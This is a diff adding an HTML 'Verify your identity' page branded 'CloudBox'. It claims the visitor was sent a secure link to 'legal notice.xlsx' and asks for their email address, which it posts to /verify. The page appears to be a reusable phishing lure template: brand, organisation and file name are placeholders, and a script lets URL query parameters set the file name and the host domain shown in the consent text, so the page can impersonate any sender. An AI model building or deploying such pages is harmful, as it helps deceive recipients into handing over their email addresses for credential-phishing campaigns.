@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Email verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <style>
+    /* ===== Brand tokens (edit these only) ===== */
+    :root{
+      --brand:#1f6fd1;            /* header + button */
+      --brand-700:#1657a6;        /* button hover/active */
+      --bg:#f5f7fb;               /* page background */
+      --card:#ffffff;             /* card background */
+      --text:#1f2937;             /* main text */
+      --muted:#6b7280;            /* secondary text */
+      --border:#e5e7eb;           /* light strokes */
+      --radius:10px;              /* card/button radius */
+      --card-shadow:0 12px 28px rgba(0,0,0,.08);
+      --maxw:420px;
+      --focus:#6aa1ff;            /* focus ring */
+    }
+    @media (prefers-color-scheme: dark){
+      :root{
+        --bg:#0f141a; --card:#121922; --text:#f2f5f9; --muted:#9aa4b2; --border:#273142;
+        --card-shadow:0 12px 28px rgba(0,0,0,.6);
+      }
+    }
+
+    /* ===== Base ===== */
+    *{ box-sizing:border-box }
+    html,body{ height:100% }
+    body{
+      margin:0;
+      font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+      background:var(--bg);
+      color:var(--text);
+    }
+
+    /* Top brand bar */
+    .brandbar{
+      height:48px;
+      background:var(--brand);
+      color:#fff;
+      display:flex; align-items:center;
+      padding:0 16px;
+      font-weight:600;
+      letter-spacing:.2px;
+    }
+
+    /* Centered container */
+    .wrap{
+      min-height:calc(100% - 48px);
+      display:grid;
+      place-items:center;
+      padding:32px 16px;
+    }
+
+    /* Card */
+    .card{
+      width:100%;
+      max-width:var(--maxw);
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      box-shadow:var(--card-shadow);
+      overflow:hidden;
+    }
+    .card-head{
+      padding:20px 24px;
+      border-bottom:1px solid var(--border);
+      text-align:center;
+    }
+    .card-title{
+      margin:4px 0 0 0;
+      font-size:22px;
+      line-height:1.25;
+      font-weight:650;
+    }
+    .card-body{ padding:20px 24px }
+    .card-body p{ margin:0 0 12px 0; color:var(--muted) }
+
+    /* File name badge */
+    .file{
+      display:inline-block;
+      padding:10px 14px;
+      border:1px solid var(--border);
+      border-radius:8px;
+      background:color-mix(in srgb, var(--card) 88%, var(--brand) 12%);
+      color:var(--text);
+      font-weight:600;
+      margin:6px 0 12px;
+      word-break:break-word;
+      max-width:100%;
+    }
+
+    /* Form */
+    .field{ margin:12px 0 0 0 }
+    label{ display:block; font-size:12px; color:var(--muted); margin-bottom:6px }
+    .input{
+      width:100%;
+      height:44px;
+      border:1px solid var(--border);
+      border-radius:8px;
+      padding:0 12px;
+      background:var(--card);
+      color:var(--text);
+      outline:none;
+    }
+    .input:focus{
+      border-color:var(--focus);
+      box-shadow:0 0 0 3px color-mix(in srgb, var(--focus) 35%, transparent);
+    }
+
+    /* Button */
+    .actions{ margin:18px 0 8px; display:flex; gap:12px }
+    .btn{
+      appearance:none; border:0; cursor:pointer;
+      height:44px; padding:0 18px; border-radius:var(--radius);
+      background:var(--brand); color:#fff; font-weight:650; width:100%;
+    }
+    .btn:hover{ background:var(--brand-700) }
+    .btn:disabled{ opacity:.6; cursor:not-allowed }
+
+    .caption{ font-size:12px; color:var(--muted); margin-top:12px }
+    .caption small{ display:block; opacity:.9 }
+
+    /* Footer */
+    .footer{
+      text-align:center; color:var(--muted);
+      font-size:12px; padding:18px 0 8px;
+    }
+    .footer a{ color:inherit }
+
+    /* Narrow */
+    @media (max-width:480px){
+      :root{ --maxw:92vw }
+      .card-title{ font-size:20px }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top brand bar -->
+  <div class="brandbar">
+    <!-- Put your brand/product here -->
+    <span id="brandName">CloudBox</span>
+  </div>
+
+  <!-- Centered card -->
+  <main class="wrap">
+    <form class="card" id="verifyForm" method="post" action="/verify">
+      <header class="card-head" aria-labelledby="t">
+        <!-- Replace SVG with your logo if desired (CID-embedded is fine) -->
+        <svg aria-hidden="true" width="28" height="28" viewBox="0 0 24 24" fill="none" style="display:block;margin:0 auto 6px">
+          <path d="M4 7a3 3 0 0 1 3-3h10a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3V7Z" stroke="currentColor" opacity=".25"/>
+          <path d="M7 10h10M7 14h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+        <h1 id="t" class="card-title">Verify your identity</h1>
+      </header>
+
+      <section class="card-body">
+        <p>You’ve been sent a secure link to:</p>
+        <div class="file" id="fileName">legal notice.xlsx</div>
+        <p>To open this secure link, enter the email address it was shared with.</p>
+
+        <div class="field">
+          <label for="email">Email address</label>
+          <input class="input" id="email" name="email" type="email" autocomplete="email"
+                 placeholder="name@domain.com" required inputmode="email" />
+        </div>
+
+        <div class="actions">
+          <button class="btn" id="continueBtn" type="submit" disabled>Continue</button>
+        </div>
+
+        <div class="caption" id="disclosure">
+          <small>By selecting “Continue”, you allow <strong id="hostDomain">files.example.com</strong> to use your email in accordance with its Privacy Notice.</small>
+        </div>
+      </section>
+    </form>
+  </main>
+
+  <div class="footer">
+    © <span id="year"></span> <span id="orgName">Example, Inc.</span> ·
+    <a href="/privacy">Privacy</a> · <a href="/cookies">Cookies</a>
+  </div>
+
+  <script>
+    // Minimal progressive enhancement
+    const email = document.getElementById('email');
+    const btn   = document.getElementById('continueBtn');
+    const year  = document.getElementById('year');
+    year.textContent = new Date().getFullYear();
+
+    // Enable button when email looks plausible
+    const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
+    email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
+
+    // Optional: capture file name & host from query (?file=...&host=...)
+    const q = new URLSearchParams(location.search);
+    if(q.get('file')) document.getElementById('fileName').textContent = q.get('file');
+    if(q.get('host')) document.getElementById('hostDomain').textContent = q.get('host');
+
+    // SECURITY NOTE: Always validate server-side; do not trust JS validation.
+  </script>
+  <noscript>
+    <div class="footer" style="padding-top:0">JavaScript is disabled. You can still submit the form.</div>
+  </noscript>
+</body>
+</html>
